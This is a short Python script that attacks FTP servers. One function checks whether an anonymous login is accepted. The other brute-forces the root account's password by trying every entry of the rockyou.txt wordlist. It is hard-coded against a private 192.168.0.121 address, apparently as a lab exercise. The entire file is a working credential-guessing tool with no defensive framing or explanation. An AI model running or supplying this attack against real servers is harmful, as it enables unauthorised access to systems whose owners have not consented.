import ftplib
import time

#If threading is required, its a better idea to keep that part that needs to be
# threaded in a function, so that the function can be started as a thread.

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(host= hostname)
        ftp.login(user='anonymous', passwd='email@id.com')
        print(f'[*] {hostname} : Anonymous Logon Succeeded')
        ftp.quit()
        return True
    except Exception as e:
        print(f'[-] {hostname} : Anonymous Logon Failed. Exception: {e}')
        return False

def bruteLogin(hostname, passwdFilePath):
    with open(passwdFilePath, 'r') as pF:
        for password in pF:
            password = password.replace('\n','')
            print(f'[+] Trying password {password}')
            try:
                ftp = ftplib.FTP(host=hostname)
                ftp.login(user='root', passwd= password)
                print(f'[*] Login successful with password {password}')
                ftp.quit()
                return True
            except Exception as e:
                print(f'[-] Logon unsuccessful with password {password}, Exception : {e}')
    return False


hostToTry = '192.168.0.121'
passwdFilePath = '/usr/share/wordlists/rockyou.txt'
bruteLogin(hostToTry, passwdFilePath)